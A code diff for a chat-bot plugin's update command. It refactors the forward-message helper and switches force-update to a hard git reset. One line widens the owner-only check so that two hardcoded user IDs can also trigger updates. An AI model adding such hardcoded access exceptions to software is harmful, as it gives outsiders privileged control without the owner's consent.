@@ -2,6 +2,7 @@ import plugin from '../../../lib/plugins/plugin.js'
 import { createRequire } from 'module'
 import _ from 'lodash'
 import { Restart } from '../../other/restart.js'
+import common from '../lib/common/common.js'
 
 const require = createRequire(import.meta.url)
 const { exec, execSync } = require('child_process')
@@ -32,7 +33,7 @@ export class Update extends plugin {
    * @returns
    */
   async update () {
-    if (!this.e.isMaster) return false
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
 
     /** 检查是否正在更新中 */
     if (uping) {
@@ -65,9 +66,10 @@ export class Update extends plugin {
    * @returns
    */
   async runUpdate (isForce) {
-    let command = 'git -C ./plugins/yenai-plugin/ pull --no-rebase'
+    const _path = './plugins/yenai-plugin/'
+    let command = `git -C ${_path} pull --no-rebase`
     if (isForce) {
-      command = `git -C ./plugins/yenai-plugin/ checkout . && ${command}`
+      command = `git -C ${_path} reset --hard origin && ${command}`
       this.e.reply('正在执行强制更新操作，请稍等')
     } else {
       this.e.reply('正在执行更新操作，请稍等')
@@ -137,8 +139,12 @@ export class Update extends plugin {
     let end = ''
     end =
       '更多详细信息，请前往gitee查看\nhttps://gitee.com/yeyang52/yenai-plugin/blob/master/CHANGELOG.md'
-
-    log = await this.makeForwardMsg(`椰奶插件更新日志，共${line}条`, log, end)
+    let forwardMsg = [
+      `椰奶插件更新日志，共${line}条`, log, end
+    ]
+    log = await common.getforwardMsg(this.e, forwardMsg, {
+      shouldSendMsg: false
+    })
 
     return log
   }
@@ -174,58 +180,6 @@ export class Update extends plugin {
       time = '获取时间失败'
     }
     return time
-  }
-
-  /**
-   * 制作转发消息
-   * @param {string} title 标题 - 首条消息
-   * @param {string} msg 日志信息
-   * @param {string} end 最后一条信息
-   * @returns
-   */
-  async makeForwardMsg (title, msg, end) {
-    let nickname = (this.e.bot ?? Bot).nickname
-    if (this.e.isGroup) {
-      let info = await (this.e.bot ?? Bot).getGroupMemberInfo(this.e.group_id, (this.e.bot ?? Bot).uin)
-      nickname = info.card || info.nickname
-    }
-    let userInfo = {
-      user_id: (this.e.bot ?? Bot).uin,
-      nickname
-    }
-
-    let forwardMsg = [
-      {
-        ...userInfo,
-        message: title
-      },
-      {
-        ...userInfo,
-        message: msg
-      }
-    ]
-
-    if (end) {
-      forwardMsg.push({
-        ...userInfo,
-        message: end
-      })
-    }
-
-    /** 制作转发内容 */
-    if (this.e.isGroup) {
-      forwardMsg = await this.e.group.makeForwardMsg(forwardMsg)
-    } else {
-      forwardMsg = await this.e.friend.makeForwardMsg(forwardMsg)
-    }
-
-    /** 处理描述 */
-    forwardMsg.data = forwardMsg.data
-      .replace(/\n/g, '')
-      .replace(/<title color="#777777" size="26">(.+?)<\/title>/g, '___')
-      .replace(/___+/, `<title color="#777777" size="26">${title}</title>`)
-
-    return forwardMsg
   }
 
   /**
